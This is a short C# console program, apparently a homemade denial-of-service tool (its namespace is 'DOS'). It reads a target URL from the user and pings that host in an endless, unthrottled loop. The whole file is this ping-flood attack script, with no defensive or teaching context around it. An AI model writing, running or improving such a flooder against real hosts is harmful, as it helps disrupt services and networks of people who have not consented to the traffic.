using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Net;
using System.Web;
using System.Net.NetworkInformation;

namespace DOS
{
    class Program
    {

        public string url;

        static void Main(string[] args)
        {
            Console.ForegroundColor = ConsoleColor.Cyan;
            Console.Write("Enter a URL: ");
            string url = Console.ReadLine();

            while (true)
            {
                PingHost(url);

            }
        }


        public static bool PingHost(string nameOrAddress)
            {
                bool pingable = false;
                Ping pinger = new Ping();
                try
                {
                    PingReply reply = pinger.Send(nameOrAddress);
                    pingable = reply.Status == IPStatus.Success;
                    Console.WriteLine("Ping sent to " + nameOrAddress);

                }
                catch (PingException)
                {
                    // Discard PingExceptions and return false;
                }
                return pingable;
            }
}
}
